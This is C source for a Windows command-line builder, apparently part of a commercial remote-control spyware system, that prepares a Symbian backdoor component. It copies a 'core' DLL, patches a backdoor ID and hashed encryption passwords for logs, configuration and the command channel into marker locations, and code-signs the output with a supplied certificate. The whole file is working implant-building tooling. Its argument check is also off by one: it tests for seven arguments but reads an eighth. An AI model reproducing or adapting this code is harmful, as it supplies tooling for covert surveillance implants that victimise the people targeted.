
#include "stdafx.h"
#include <Windows.h>
#include <openssl\md5.h>
#include "polymer.h"
#include "fileutils.h"

bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);
extern BOOL SignMobileComponent(TCHAR *wsFile, TCHAR *wsCert);

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hFile;
	BYTE *pBlockPtr	= NULL;
	CHAR szBackdoorId[256];
	CHAR szLogPassword[256];
	CHAR szConfPassword[256];
	CHAR szChanPassword[256];
	WCHAR wsPFXFile[MAX_PATH];
	WCHAR wsDllFile[MAX_PATH];
	WCHAR wsOutFile[MAX_PATH];
	unsigned int iLen = 0;

	if (argc != 7) {
		printf("ERROR: \n");
		printf("  usage:  RCSSymbianPolymer.exe  <bid> <log_pass> <conf_pass> <chanpass> <cert> <core> <output>\n\n");
		printf("  <bid> is the backdoor_id\n");
		printf("  <log_pass> is the password for the log encryption\n");
		printf("  <conf_pass> is the password for the conf encryption\n");
		printf("  <chanpass> is the password for the channel encryption\n");
		printf("  <cert> is the cert to sign the sysx\n");
		printf("  <core> is the core to be polymerized\n");
		printf("  <output> is the output file\n\n");
		return 0;
	}

	sprintf_s(szBackdoorId, sizeof(szBackdoorId), "%S", argv[1]);
	sprintf_s(szLogPassword, sizeof(szLogPassword), "%S", argv[2]);
	sprintf_s(szConfPassword, sizeof(szConfPassword), "%S", argv[3]);
	sprintf_s(szChanPassword, sizeof(szChanPassword), "%S", argv[4]);
	wsprintf(wsPFXFile, L"%s", argv[5]);
	wsprintf(wsDllFile, L"%s", argv[6]);
	wsprintf(wsOutFile, L"%s", argv[7]);

	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/
	if (strlen(szBackdoorId) < strlen("RCS_0000000000")) {
		printf("Backdoor_id should be at least %d characters\n", strlen("RCS_0000000000"));
		return ERROR_EMBEDDING;
	}

	if (strlen(szLogPassword) < AES_PASS_LEN) {
		printf("Log Password should be at least %d characters\n", AES_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	if (strlen(szConfPassword) < AES_PASS_LEN) {
		printf("Conf Password should be at least %d characters\n", AES_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	if (strlen(szChanPassword) < CHAN_PASS_LEN) {
		printf("Channel password should be at least %d characters\n", CHAN_PASS_LEN);
		return ERROR_EMBEDDING;
	}

	if ( (hFile = CreateFile(wsPFXFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find FPX file [%S]\n", wsPFXFile);
		return ERROR_EMBEDDING;
	} else {
		DWORD len = GetFileSize(hFile, NULL);
		//if (len < PEM_KEY_LEN) {
		//	printf("Bad certificate file len [%S]\n", wsCertFile);
		//	return ERROR_EMBEDDING;
		//}
		CloseHandle(hFile);
	}

	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/

	printf("Ready to go...\n");
	printf("BACKDOOR_ID   [%s]\n", szBackdoorId);
	printf("LOG PASSWORD  [%s]\n", szLogPassword);
	printf("CONF PASSWORD [%s]\n", szConfPassword);
	printf("CHAN PASSWORD [%s]\n", szChanPassword);
	printf("PFXFILE       [%S]\n", wsPFXFile);
	printf("INPUT DLL     [%S]\n", wsDllFile);
	printf("OUTPUT DLL    [%S]\n\n", wsOutFile);

	if (CopyFile(wsDllFile, wsOutFile, FALSE) == FALSE) {
		printf("Cannot create output file[%S]\n", wsOutFile);
		return ERROR_OUTPUT;
	}

	/************************************************************************/
	/* BINARY PATCHING                                                      */
	/************************************************************************/

	BYTE bufmd5[MD5_DIGEST_LENGTH];

	pBlockPtr = (BYTE *) LoadFile(wsOutFile, &iLen);

	// Patching Passwod dei log
	MD5((const UCHAR *)szLogPassword, strlen(szLogPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_LOG_PASS_MARK, AES_PASS_MARK_LEN))
		printf("Password embedded... ok\n");
	else {
		printf("Cannot embed Log Password [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching Passwod della conf
	MD5((const UCHAR *)szConfPassword, strlen(szConfPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, AES_PASS_LEN, AES_CONF_PASS_MARK, AES_PASS_MARK_LEN))
		printf("Password embedded... ok\n");
	else {
		printf("Cannot embed Conf Password [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching Passwod del protocollo
	MD5((const UCHAR *)szChanPassword, strlen(szChanPassword) , (PUCHAR) bufmd5);
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) bufmd5, CHAN_PASS_LEN, CHAN_PASS_MARK, CHAN_PASS_MARK_LEN))
		printf("Channel Password embedded... ok\n");
	else {
		printf("Cannot embed Channel Password [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching  backdoor ID
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) szBackdoorId, BACKDOOR_ID_LEN, BACKDOOR_ID_MARK, BACKDOOR_ID_LEN))
		printf("Backdoor_id embedded... ok\n");
	else {
		printf("Cannot embed Backdoor_id [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	// Patching nome file configurazione
	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) CONFIG_FILENAME, wcslen(CONFIG_FILENAME) * sizeof(WCHAR), CONFIG_NAME_MARK, CONFIG_NAME_MARK_LEN))
		printf("Config name embedded... ok\n");
	else {
		printf("Cannot embed Config Name [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	UnloadFile(pBlockPtr);

	/************************************************************************/
	/* SIGNING                                                              */
	/************************************************************************/


	if (SignMobileComponent(wsOutFile, wsPFXFile))
		printf("Using PFX to sign code... ok\n");
	else {
		printf("Cannot sign with PFX file [%S]\n", wsPFXFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}


	printf("Output file... ok\n");


	return ERROR_SUCCESS;
}


bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len)
{
	BYTE *pDataSect	= NULL;
	bool iRet = false;

	pDataSect = pBlockPtr;

	if( pBlockPtr == NULL )
		return false;

	__try {
		while(  pBlockPtr < (pDataSect + iLen) ) {

			if( !memcmp(pBlockPtr,mark_b, mark_len) )
				break;
			else
				pBlockPtr++;
		}
	} __except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION ) {
		pBlockPtr = NULL;
	}

	if( pBlockPtr  && (pBlockPtr < ( pDataSect + iLen - 1 ) )   ) {

		memset(pBlockPtr, 0, (int)mark_len);
		memcpy(pBlockPtr, block, (int)block_len);

		iRet = true;

	} else 
		iRet = false;

	return iRet;
}

